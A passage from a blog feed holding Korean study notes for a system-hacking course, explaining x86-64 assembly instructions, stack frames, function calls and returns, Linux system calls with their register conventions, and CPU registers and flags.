&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;를 수행했을 때, 맨 마지막의 not eax까지를 수행하면 rax의 하위 32비트가 1의 보수를 취하여 다시 rax의 하위 32비트를 채우게 된다. rax의 하위 32비트가 eax이고, 실제로 그렇게 사용할 수 있다는 점 잊지 말자!&lt;/p&gt;

&lt;h3 id=&quot;비교-연산-명령어&quot;&gt;비교 연산 명령어&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;“두 피연산자의 값을 비교하고, 플래그를 설정한다.”&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;cmp와 test의 비교는 리버싱을 공부할 때 많이 헷갈렸던 부분이다. 주의하자!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;cmp op1, op2&lt;/strong&gt;&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;op1과 op2를 비교한다.&lt;/li&gt;
    &lt;li&gt;“빼서” 비교한다.&lt;/li&gt;
    &lt;li&gt;연산의 결과는 ZF에 설정된다.&lt;/li&gt;
    &lt;li&gt;보통 “같은지” 확인하기 위해 사용한다.
      &lt;ul&gt;
        &lt;li&gt;같다면 ZF=1로 설정되고, jmp 분기문에서 설정에 따라 코드 플로우를 분기시키게 된다.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;test op1, op2&lt;/strong&gt;&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;op1과 op2를 비교한다.&lt;/li&gt;
    &lt;li&gt;“AND”를 취해 비교한다.&lt;/li&gt;
    &lt;li&gt;연산의 결과는 ZF에 설정된다.&lt;/li&gt;
    &lt;li&gt;보통 “자기 자신이” 0이었는지 확인하기 위해 사용한다.
      &lt;ul&gt;
        &lt;li&gt;자신이 0이었다면 ZF=1로 설정된다.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;왜냐하면 자기 자신과 AND를 취했을 때 0이 나올 수 있는 경우는 오로지 자기 자신이 0일 때 뿐이므로!&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;분기-명령어&quot;&gt;분기 명령어&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;“rip를 이동시켜 실행 흐름을 바꾼다!”&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;리버싱을 할 때 정말 잘 알아둬야 한다. 왜냐하면 보통의 프로그램들은 분기에 따른 경우수를 기반으로 행동을 하기 때문이다.&lt;/p&gt;

&lt;p&gt;rip가 이동되는 이유는 컴퓨터 아키텍처를 공부한 적 있다면 알 수 있다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CPU는 jmp등의 분기문을 만나면 PC에 저장된 다음 인스트럭션 주소를 바꿔서 jmp 명령어가 가리키는 인스트럭션을 수행하게 되는데, 이때 PC가 rip이기 때문에 분기 명령어는 결론적으로 rip를 이동시켜 실행 흐름을 바꾸게 된다.&lt;/li&gt;
  &lt;li&gt;jmp 계열 명령어는 jmp op1, op2일 때 op1을 기준으로 이름을 붙이게 된다.
    &lt;ul&gt;
      &lt;li&gt;ex) jg op1, op2 // jump if op1 is greater than op2&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;x86-assembly-part-2&quot;&gt;x86 Assembly: Part 2&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;리버싱 공부하면서 이미 했던 거라 여기에서는 간단하게 하고 넘어갑니다.&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;스택: 운영체제의 핵심 자료구조&lt;/li&gt;
  &lt;li&gt;프로시저: C언어의 함수에 대응&lt;/li&gt;
  &lt;li&gt;시스템 콜: 시스템 해킹의 관점에서 정말 중요함.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;x86-64-어셈블리-명령어-pt2&quot;&gt;x86-64 어셈블리 명령어 Pt.2&lt;/h2&gt;

&lt;h3 id=&quot;스택&quot;&gt;스택&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;push: 스택에 쌓아넣기
pop: 스택에서 빼내기&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;push val: val에 들어있는 값을 스택의 최상단에 쌓음
      &lt;ul&gt;
        &lt;li&gt;이 때 일어나는 연산을 pseudo-code로 표현하면 아래와 같다.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;```wasm
rsp -= 8 //stack grows from high to low
[rsp] = val
```
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;pop reg: 스택 최상단의 값을 꺼내서 reg에 대입
    &lt;ul&gt;
      &lt;li&gt;이 때 일어나는 연산을 pseudo-code로 표현하면 아래와 같다.&lt;/li&gt;
    &lt;/ul&gt;

    &lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;  rsp += 8 // decrease stack span
  reg = [rsp-8] //pop
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;프로시저&quot;&gt;프로시저&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;프로시저의 호출 및 반환과 관련해서는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;leave&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; 명령어를 사용한다.&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;프로시저 불러서 진입하기: &lt;strong&gt;call&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;프로시저에서 나가서 원래의 함수로 돌아오기: &lt;strong&gt;return&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;스택프레임 정리하기: &lt;strong&gt;leave&lt;/strong&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;프로시저를 call 할 당시, 원래의 함수에서 call 다음에 수행할 인스트럭션의 명령어 주소를 스택에 push 해둔 뒤, 콜했던 프로시저의 시작으로 rip를 이동하게 되는데, 이 때 스택에 저장되는 인스트럭션의 주소를 ‘Return address’라 칭한다.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;call addr: addr에 있는 프로시저 호출
    &lt;ul&gt;
      &lt;li&gt;이 때 일어나는 연산을 pseudo-code로 표현하면 아래와 같다.&lt;/li&gt;
    &lt;/ul&gt;

    &lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;  push return_address // push return address into the stack
  jmp addr
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;leave: 스택프레임 정리해서 원래 함수의 스택프레임 복구하기
    &lt;ul&gt;
      &lt;li&gt;&lt;strong&gt;leave 명령어와 동일한 기능을 수행하는 어셈블리 명령어의 조합은 아래와 같다.&lt;/strong&gt;&lt;/li&gt;
    &lt;/ul&gt;

    &lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;  **mov** rsp, rbp // 현재 함수에서의 스택 밑바닥이 원래 함수에서의 스택의 가장 꼭대기가 된다.
               // 즉, 현재 스택 꼭대기: 원래 함수의 스택 꼭대기에서 하나 더 간 상태.
  						 // 지금 rsp가 가리키는 위치에는 원래 함수의 스택 베이스 주소가 있다.
  **pop** rbp // 원래 함수의 스택 베이스 주소를 빼서 rbp에 넣어 준다.
  				// 또한 rsp를 하나 내림으로써 원래 함수의 스택 꼭대기와 일치시킨다.
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;ret: return address로 rip를 위치시킨다.
    &lt;ul&gt;
      &lt;li&gt;ret 명령어와 동일한 기능을 수행하는 어셈블리 명령어는 아래와 같다.&lt;/li&gt;
    &lt;/ul&gt;

    &lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;  pop rip // leave를 거친 이후 rsp가 가리키는 곳에는 콜했던 프로시저의 주소로 rip를 움직이기 전에
  			  // 넣어 두었던 다음 인스트럭션의 주소가 저장되어 있다.
  				// 따라서 다음에 수행할 인스트럭션의 주소를 스택에서 빼서 rip에 넣어 줌으로써
  				// 원래의 코드 플로우를 수복한다. 
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;해당 명령어가 실제로 펑션콜과 리턴 과정에서 어떻게 사용되는지 시나리오 형식으로 설명해 보자.&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;함수 A를 실행하다가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call function_B&lt;/code&gt; 명령어를 맞닥뜨렸다.
    &lt;ol&gt;
      &lt;li&gt;4에서 실행될 다음 인스트럭션의 주소가 스택에 push 된다.&lt;/li&gt;
      &lt;li&gt;함수 A의 스택 프레임을 유지하기 위해 A 스택 프레임의 rbp가 스택에 push 된다.&lt;/li&gt;
      &lt;li&gt;새로운 스택 프레임을 할당해 주기 위해 rbp를 rsp의 위치로 옮긴다.&lt;/li&gt;
      &lt;li&gt;앞에서 배웠듯, OS는 스택 프레임을 할당할 때 소규모로 할당한 후 가변적으로 운영한다. 따라서, 새로운 스택 프레임 공간을 할당하기 위해 rsp에서 0x30 정도를 뺀다.(통상적)&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;이렇게 새롭게 할당된 스택 프레임과 기존의 A의 스택 프레임 구조를 확인하면 아래와 같다.&lt;/p&gt;

        &lt;table&gt;
          &lt;tbody&gt;
            &lt;tr&gt;
              &lt;td&gt;========새로운========&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;=======스택 프레임======&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;=========공간=========&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;A의 rbp 주소&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;A 상에서의 다음 인스트럭션 주소&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;기존에 A에서 쓰고 있던 임시 데이터들&lt;/td&gt;
            &lt;/tr&gt;
          &lt;/tbody&gt;
        &lt;/table&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;함수 B를 실행한다.
    &lt;ol&gt;
      &lt;li&gt;앞에서 배웠듯, 스택에는 지역 변수가 저장된다. 따라서 함수 B의 지역 변수를 새로운 스택 프레임에 저장해 준다.&lt;/li&gt;
      &lt;li&gt;스택 프레임 위에서 여러 연산을 수행한다. 스택 프레임은 함수별로 할당되므로 해당 함수 한정으로만 유효할 수 있는 데이터를 스택에 저장할 것이다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;함수 A로 복귀한다.
    &lt;ol&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;leave&lt;/code&gt; 명령어가 실행된다. 따라서, rsp가 rbp의 위치로 이동하고 스택에 있던 A의 rbp 주소가 pop 되면서 rbp가 기존의 A의 스택 프레임의 rbp 주소를 가지게 된다.
        &lt;ul&gt;
          &lt;li&gt;한 마디로, B의 스택 프레임이 정리된 이후 A의 스택 프레임이 복구된다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;함수 A 상에서의 다음 인스트럭션을 실행한다.
    &lt;ol&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt; 명령어가 실행된다. 따라서, A 상에서의 다음 인스트럭션 주소가 rip로 들어간다.
        &lt;ul&gt;
          &lt;li&gt;이 시점에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; 을 수행하기 이전의 A의 스택 프레임 상태가 완전히 복구된다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;rip가 가리키는 주소의 명령어를 실행한다.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;시스템-콜&quot;&gt;시스템 콜&lt;/h3&gt;

&lt;p&gt;OS를 공부했다면 쉽게 이해할 수 있는 내용이다. 사실 OS 책의 1장 1페이지 정도 펼쳐봤다면 이해할 수 있는 내용이다. 따라서 자세한 부연 설명을 붙이지 않고, 간단히 정리만 하고 넘어간다.&lt;/p&gt;

&lt;hr /&gt;

&lt;blockquote&gt;
  &lt;p&gt;OS는 시스템 보호를 위해 시스템과 직결된 행위(ex: 네트워크 통신, 파일시스템 테이블 생성/추가/삭제, 파일 Read/Write…)는 실행 권한을 분리해서 관리한다. 이럴 때 부여하는 권한이 바로 커널 권한과 유저 권한이다. 유저 권한을 가진 프로세스들은 커널 권한이 필요한 시스템 행위에 직접 엑세스할 수 없고, &lt;strong&gt;OS에게 요청해&lt;/strong&gt; OS가 대신 커널 권한이 필요한 시스템 행위를 수행하고 그 결과를 받아보는 것이 기본이다.&lt;/p&gt;

  &lt;p&gt;이때 OS는 유저 권한과 커널 권한을 사용하는 상태를 오가는데, 유저 권한을 사용할 때를 ‘유저 모드’, 커널 권한을 사용할 때를 ‘커널 모드’에 있다고 표현한다.&lt;/p&gt;

  &lt;p&gt;개인적으로 OS는 정말 재미있고 흥미로운 문제와 해결의 연속이라고 느꼈기 때문에, 만일 흥미가 생겼다면 공부해 보는 것을 추천한다. 리눅스부터 공부하는 게 좋을 것이다. 멀웨어 분석이 목표라면 윈도우를 공부해야 하겠지만…&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;Q. 그럼 프로세스에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exec echo HOSTNAME&lt;/code&gt; 을 실행할 때 프로세스는 커널 모드로 진입하게 되는 건가요?&lt;/li&gt;
    &lt;li&gt;A. 아닙니다. OS의 구성요소가 아닌 유저 레벨에서 생성되고 관리되는 요소들이라면 무조건 유저 모드에서 벗어날 수 없습니다. 해당 프로세스는 커널 권한이 필요한 행위를 수행하고 싶을 때 &lt;strong&gt;OS에게 수행을 요청&lt;/strong&gt;하고 그 결과만 받아보게 됩니다. 즉 OS가 커널 모드로 진입하고 빠져나옵니다.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;즉, OS를 침해하는 해킹이 가장 심각한 결과를 이끌어내는 경우는 해당 해킹이 OS의 커널 모드 권한을 빼앗았을 때 발생한다.&lt;/p&gt;

&lt;p&gt;그렇다면 시스템 콜(System Call)이란 무엇일까? 위에 서술한 내용 중에 답이 있다… (소곤소곤)&lt;/p&gt;

&lt;p&gt;굵은 글씨로 쓰인 내용을 보자. 그리고 다음 설명을 보자. System Call이란 유저 모드에서 커널 모드에서의 수행이 필요할 때 ‘요청하는 것’이다. 이해가 확 될 것이다.&lt;/p&gt;

&lt;p&gt;정리해서,&lt;/p&gt;

&lt;aside&gt;
⚙ 유저 모드의 프로세스에서 커널 모드의 동작이 필요하다. → System Call을 한다. → OS는 해당 요청을 승인해 커널 모드의 동작을 수행한다. → OS는 수행 결과를 반환한다. → 프로세스는 반환받은 결과를 이용한다.

&lt;/aside&gt;

&lt;p&gt;x64 아키텍처에서는 시스템콜을 하기 위해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; 명령어를 쓴다. &lt;del&gt;나도 프로그래밍 하다가 본 것 같다… 아마도?&lt;/del&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;여기에서 끝나면 안된다. 지금 이 포스트의 목적은 ‘어셈블리어’를 공부하는 것이지 OS 개론을 공부하는 게 아니기 때문이다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; 명령어로 사용할 수 있는 시스템 콜은 함수다. 즉, 인자가 있고, 해당 인자를 이용해 어떠한 행위를 한다. 이 경우에는 커널에게 ‘사전 정보’를 주면서 ‘원하는 행위’를 요청하는 것임을 추측할 수 있다.&lt;/p&gt;

&lt;p&gt;이렇게 원하는 행위와 사전 정보를 전달할 때, 아키텍처 레벨로 내려가 본다면 당연히 레지스터가 개입할 것이다. 파라미터가 있는 펑션콜이 수행되는 과정을 한 번 어셈블리 디버거로 보게 되면 직관적으로 알 수 있다. 그렇다면 어떤 레지스터가 통상적으로 개입할까? 그리고 어떤 레지스터에 ‘사전 정보’와 ‘원하는 행위’가 들어갈까?&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;리눅스의 경우 ‘원하는 행위’를 가리키는 데이터는 rax에 저장된다.&lt;/strong&gt; 해당 값은 시스템 콜 테이블이라는 시스템 콜이 저장되어 있는 테이블의 인덱스 넘버이므로, 어떠한 행위를 원하는지를 시스템이 인식할 수 있다.&lt;/p&gt;

&lt;p&gt;어떤 행위를 원하는지 알았다면 그 행위에 필요한 인자를 받아야 할 차례다. 한 예로, 현재 메모리에 있는 값을 읽어 와 콘솔에 write하려 한다고 하자. (write가 핵심이다. 프로세스가 선언한 데이터가 저장되어 있는 영역을 read할 땐 유저 권한으로 한다. 애초에 메모리에는 커널만을 위한 영역이 따로 있어서 엄격하게 커널과 유저 권한을 분리한다)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;write를 하기 위해서는 ‘어디에’ ‘무엇을’ ‘얼마만큼의 길이로’ 쓸 것인지를 알려 줘야 한다.&lt;/strong&gt; 그리고 OS는 정확하게 이 세 가지 요건을 입력받아 write 연산에 사용한다. 각 정보는 rdi, rsi, rdx에 저장된다. 레지스터의 용도를 고려해 보면 일리가 있게 저장되는 셈이다.&lt;/p&gt;

&lt;p&gt;rdi는 destination, 즉 정보가 어디로 향할지를 저장하는 데 쓰이고, rsi는 source, 즉 정보의 출처가 어디인지 지정하는 데 쓰이므로 각각 ‘어디에’와 ‘무엇을’ 을 저장하는 데 적합한 논리를 가지고 있기 때문이다.&lt;/p&gt;

&lt;p&gt;그렇다면 ‘얼마만큼의 길이로’를 저장하는 rdx는? 이건 사실 일반적인 convention 때문에 쓰인다. 그 convention이란 무엇이냐면…&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;rdi&lt;/td&gt;
      &lt;td&gt;첫 번째 인자 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rsi&lt;/td&gt;
      &lt;td&gt;두번째 인자 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rdx&lt;/td&gt;
      &lt;td&gt;세번째 인자 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;rcx&lt;/td&gt;
      &lt;td&gt;네번째 인자 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;r8&lt;/td&gt;
      &lt;td&gt;다섯번째 인자 저장&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;r9&lt;/td&gt;
      &lt;td&gt;여섯번째 인자 저장&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;바로 위의 테이블이다. 일반적으로 함수의 파라미터를 전달할 때 레지스터는 위와 같은 순서로 인자를 저장한다.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;그런데 좀 이상하네… 지금 이걸 쓰면서 생긴 의문인데, 이런 convention은 system call에 인자를 전달하면서 생겨나서 유저 권한의 함수를 콜할 때도 쓰게 된 거 아닌가? 그럼 system call에 rdx를 세번째 인자를 전달할 때 쓰는 이유는 대체 왜지? 언젠가 알게 되겠지… 지금은 이게 핵심이 아니니까 넘어가자.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;정리해 보자. 만일 콘솔에 메모리 상의 어떤 정보를 읽어와 write한다고 치면&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; 명령어가 실행된다. 이렇게 syscall 명령어가 실행되면 &lt;strong&gt;CPU는 rax부터 쳐다보게 된다.&lt;/strong&gt; &lt;del&gt;(언니 뭐부터 할까요)&lt;/del&gt; 그렇게 어떤 시스템 콜을 실행할지 결정하면 CPU는 해당 시스템 콜에 사용할 인자를 확인하기 위해 아래의 순서로 레지스터를 참조한다.(유저 권한에서 시스템 콜을 요청할 때는 아래의 sequence로 진행되고, 커널 권한의 인터페이스에서 뭔가를 할 땐 또 다른 sequence로 레지스터를 읽는다)&lt;/p&gt;

&lt;aside&gt;
⚙ **rdi → rsi → rdx → rcx → r8 → r9 → stack**

&lt;/aside&gt;

&lt;p&gt;rax에서 write system call을 가리키고 있기 때문에, 이제 커널은 write(out_mode, data_add, length)를 수행하게 된다. 인자가 3개이므로 커널이 참조하는 레지스터는 rdi, rsi, rdx가 된다.&lt;/p&gt;

&lt;p&gt;참고로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syscall&lt;/code&gt; 이 리턴되면 레지스터 컨벤션에 따라 rax에 시스템 콜의 결과가 저장된다. 에러 번호라든가 성공 여부라든가…&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;부록: System call table 중 주요 몇 가지 시스템 콜(검색하면 나옴)&lt;/p&gt;

    &lt;table&gt;
      &lt;thead&gt;
        &lt;tr&gt;
          &lt;th&gt;syscall&lt;/th&gt;
          &lt;th&gt;rax&lt;/th&gt;
          &lt;th&gt;arg0 (rdi)&lt;/th&gt;
          &lt;th&gt;arg1 (rsi)&lt;/th&gt;
          &lt;th&gt;arg2 (rdx)&lt;/th&gt;
        &lt;/tr&gt;
      &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;read&lt;/td&gt;
          &lt;td&gt;0x00&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;char *buf&lt;/td&gt;
          &lt;td&gt;size_t count&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;write&lt;/td&gt;
          &lt;td&gt;0x01&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt;const char *buf&lt;/td&gt;
          &lt;td&gt;size_t count&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;open&lt;/td&gt;
          &lt;td&gt;0x02&lt;/td&gt;
          &lt;td&gt;const char *filename&lt;/td&gt;
          &lt;td&gt;int flags&lt;/td&gt;
          &lt;td&gt;umode_t mode&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;close&lt;/td&gt;
          &lt;td&gt;0x03&lt;/td&gt;
          &lt;td&gt;unsigned int fd&lt;/td&gt;
          &lt;td&gt; &lt;/td&gt;
          &lt;td&gt; &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;mprotect&lt;/td&gt;
          &lt;td&gt;0x0a&lt;/td&gt;
          &lt;td&gt;unsigned long start&lt;/td&gt;
          &lt;td&gt;size_t len&lt;/td&gt;
          &lt;td&gt;unsigned long prot&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;connect&lt;/td&gt;
          &lt;td&gt;0x2a&lt;/td&gt;
          &lt;td&gt;int sockfd&lt;/td&gt;
          &lt;td&gt;struct sockaddr * addr&lt;/td&gt;
          &lt;td&gt;int addrlen&lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;execve&lt;/td&gt;
          &lt;td&gt;0x3b&lt;/td&gt;
          &lt;td&gt;const char *filename&lt;/td&gt;
          &lt;td&gt;const char *const *argv&lt;/td&gt;
          &lt;td&gt;const char *const *envp&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Tue, 28 Jun 2022 18:25:23 +0900</pubDate>
        <link>http://localhost:4000/blog/dreamhack_system_hacking/step2-2</link>
        <guid isPermaLink="true">http://localhost:4000/blog/dreamhack_system_hacking/step2-2</guid>
      </item>
    
      <item>
        <title>System Hackig Step 2</title>
        <description>&lt;h1 id=&quot;stage-2&quot;&gt;STAGE 2&lt;/h1&gt;

&lt;h1 id=&quot;background-computer-architecture&quot;&gt;Background: Computer Architecture&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Instruction Set Architecture: CPU가 사용하는 명령어와 관련된 설계. CPU가 해석하는 명령어의 집합.
    &lt;ul&gt;
      &lt;li&gt;가장 널리 사용되는 ISA: Intel x86-64, ARM&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;x86-64-architectureamd64-architecture&quot;&gt;X86-64 Architecture=AMD64 Architecture&lt;/h2&gt;

&lt;h3 id=&quot;x64-아키텍쳐의-레지스터&quot;&gt;x64 아키텍쳐의 레지스터&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;General Register
    &lt;ul&gt;
      &lt;li&gt;주용도는 있지만, 그 외의 다양한 용도로 사용될 수 있는 레지스터.
        &lt;ul&gt;
          &lt;li&gt;32비트 아키텍쳐 CPU가 제공할 수 있는 가상메모리의 크기: 4GB&lt;/li&gt;
          &lt;li&gt;64비트 아키텍쳐 CPU가 제공할 수 있는 가상메모리의 크기: 16EB(엑사바이트)-어마어마하게 큰 공간으로, 프로세스의 성능에 제한을 걸 일이 없다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;x64의 경우 각 범용 레지스터에는 8바이트 저장&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;이름이 r로 시작함-64비트 아키텍쳐. 32비트 아키텍쳐는 e로 시작함.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/systemHackingStep2.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;x64의 general register중 주용도가 정해진 레지스터들.&lt;/p&gt;

        &lt;p&gt;→ ebx는 rbx와는 다르게 메모리 주소를 저장하기 위한 용도로 사용됐었음.&lt;/p&gt;

        &lt;p&gt;→ edx는 rdx와는 다르게 부호 관련한 명령을 저장하기 위한 용도로 사용됐었음.&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Segment Register
    &lt;ul&gt;
      &lt;li&gt;6개 종류: cs, ss, ds, es, fs, gs&lt;/li&gt;
      &lt;li&gt;64비트로 아키텍처 확장되면서 용도에 큰 변화가 생김.
        &lt;ul&gt;
          &lt;li&gt;32비트 시절… general register 크기가 작으니 사용 가능한 메모리 주소 폭도 좁았음.&lt;/li&gt;
          &lt;li&gt;따라서 오프셋에 필요한 세그먼트 주소를 저장해 주기 위해 사용됐었음.=사용 가능한 메모리 주소 폭을 늘려 줬음.
            &lt;ul&gt;
              &lt;li&gt;실제 주소 = 오프셋 주소 + 세그먼트 주소&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;그런데 64비트 구조가 되면서 사용 가능한 메모리 주소 폭이 매우 넓어짐.&lt;/li&gt;
          &lt;li&gt;따라서, 이젠 주소를 간접적으로 표현해 주기 위해 사용하는 일이 없어짐.&lt;/li&gt;
          &lt;li&gt;x64에서 cs, ds, ss는 코드 영역, 데이터, 스택 메모리 영역을 가리킬 때 사용됨.&lt;/li&gt;
          &lt;li&gt;나머지 레지스터는 운영체제 별로 용도를 결정할 수 있도록 범용적으로 제작되었음.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Instruction Pointer Register
    &lt;ul&gt;
      &lt;li&gt;다음에 실행할 instruction 가리키기.&lt;/li&gt;
      &lt;li&gt;x64: rip(8 byte), x86-64: eip(4 byte)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Flag Register
    &lt;ul&gt;
      &lt;li&gt;프로세서의 현재 상태를 저장하고 있는 레지스터.&lt;/li&gt;
      &lt;li&gt;x86: 16 bit → x64: 64 bit, “RFLAGS”&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;RFLAGS는 64개의 플래그를 사용할 수 있지만, 실질적으로는 오른쪽 20개 정도 비트만 사용.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/systemHackingStep2_1.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

        &lt;p&gt;시스템 해킹을 할 때 주로 접할 플래그&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;레지스터-호환&quot;&gt;레지스터 호환&lt;/h3&gt;

&lt;p&gt;16비트 아키텍처: 앞에 아무것도 안 붙음&lt;/p&gt;

&lt;p&gt;32비트 아키텍처: 앞에 e 붙음&lt;/p&gt;

&lt;p&gt;64비트 아키텍처: 앞에 r 붙음&lt;/p&gt;

